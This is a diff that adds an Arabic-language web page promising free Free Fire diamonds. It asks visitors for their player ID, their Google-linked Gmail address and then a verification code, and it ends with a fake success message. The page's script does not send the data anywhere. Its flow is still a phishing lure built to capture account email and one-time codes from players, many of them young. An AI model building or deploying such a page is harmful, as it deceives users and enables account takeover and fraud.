@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>شحن جواهر Free Fire</title>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background: linear-gradient(135deg, #1a1a1a, #3d0a6b);
+  color: #fff;
+  margin: 0;
+  padding: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+}
+.container {
+  width: 100%;
+  max-width: 500px;
+  background: #222;
+  padding: 30px;
+  border-radius: 20px;
+  box-shadow: 0 0 25px rgba(0,0,0,0.8);
+  text-align: center;
+}
+h2 {
+  color: #ffcd00;
+  margin-bottom: 20px;
+}
+input, select, button {
+  width: 100%;
+  padding: 14px;
+  margin-bottom: 15px;
+  border-radius: 10px;
+  border: none;
+  font-size: 16px;
+}
+input, select {
+  background: #333;
+  color: #fff;
+}
+button {
+  background: #5e23ff;
+  color: #fff;
+  cursor: pointer;
+  font-weight: bold;
+  transition: 0.3s;
+}
+button:hover {
+  transform: scale(1.05);
+  background: #ff23b4;
+}
+.alert {
+  background: #ffcd00;
+  color: #000;
+  padding: 12px;
+  border-radius: 10px;
+  text-align: center;
+  margin-bottom: 15px;
+  display: none;
+}
+.step {
+  display: none;
+}
+.step.active {
+  display: block;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- خطوة 1: الاسم + ID + الجواهر -->
+
+  <div class="step active" id="step1">
+    <h2>معلومات اللاعب + الجواهر</h2>
+    <input type="text" id="playerName" placeholder="اسم اللاعب">
+    <input type="text" id="playerId" placeholder="ID اللاعب">
+    <label for="amount">اختيار عدد الجواهر:</label>
+    <select id="amount">
+      <option value="100">100 جوهرة</option>
+      <option value="500">500 جوهرة</option>
+      <option value="1000">1000 جوهرة</option>
+      <option value="2500">2500 جوهرة</option>
+      <option value="5000">5000 جوهرة</option>
+      <option value="10000">10000 جوهرة</option>
+    </select>
+    <button onclick="nextStep(1)">تأكيد المعلومات</button>
+    <div class="alert" id="alert1">تم تأكيد معلوماتك!</div>
+  </div>
+
+  <!-- خطوة 2: الايميل -->
+
+  <div class="step" id="step2">
+    <h2>الايميل الخاص بحسابك في لعبة Free Fire (مرتبط بجوجل)</h2>
+    <input type="email" id="userEmail" placeholder="أدخل الايميل">
+    <button onclick="nextStep(2)">تأكيد الايميل</button>
+    <div class="alert" id="alert2">يمكنك الآن إدخال رمز التحقق</div>
+  </div>
+
+  <!-- خطوة 3: رمز التحقق -->
+
+  <div class="step" id="step3">
+    <h2>رمز التحقق</h2>
+    <input type="text" id="verificationCode" placeholder="أدخل رمز التحقق">
+    <button onclick="submitForm()">تأكيد الرمز</button>
+    <div class="alert" id="alert3">تم تأكيد الرمز! يمكنك الآن متابعة شحن الجواهر</div>
+  </div>
+
+</div>
+
+<script>
+function nextStep(currentStep) {
+  if(currentStep === 1) {
+    const name = document.getElementById('playerName').value;
+    const id = document.getElementById('playerId').value;
+    const amount = document.getElementById('amount').value;
+    if(!name || !id) {
+      alert('يرجى إدخال الاسم وID اللاعب!');
+      return;
+    }
+    document.getElementById('alert1').style.display = 'block';
+    setTimeout(() => {
+      document.getElementById('step1').classList.remove('active');
+      document.getElementById('step2').classList.add('active');
+    }, 1500);
+  } else if(currentStep === 2) {
+    const email = document.getElementById('userEmail').value;
+    if(!email) {
+      alert('يرجى إدخال الايميل!');
+      return;
+    }
+    if(!email.endsWith("@gmail.com")) {
+      alert('يرجى إدخال بريد Gmail صحيح!');
+      return;
+    }
+    document.getElementById('alert2').style.display = 'block';
+    setTimeout(() => {
+      document.getElementById('step2').classList.remove('active');
+      document.getElementById('step3').classList.add('active');
+    }, 1500);
+  }
+}
+
+function submitForm() {
+  const code = document.getElementById('verificationCode').value;
+  if(!code) {
+    alert('يرجى إدخال رمز التحقق!');
+    return;
+  }
+  document.getElementById('alert3').style.display = 'block';
+  setTimeout(() => {
+    alert('تمت العملية بنجاح!');
+  }, 1000);
+}
+</script>
+
+</b
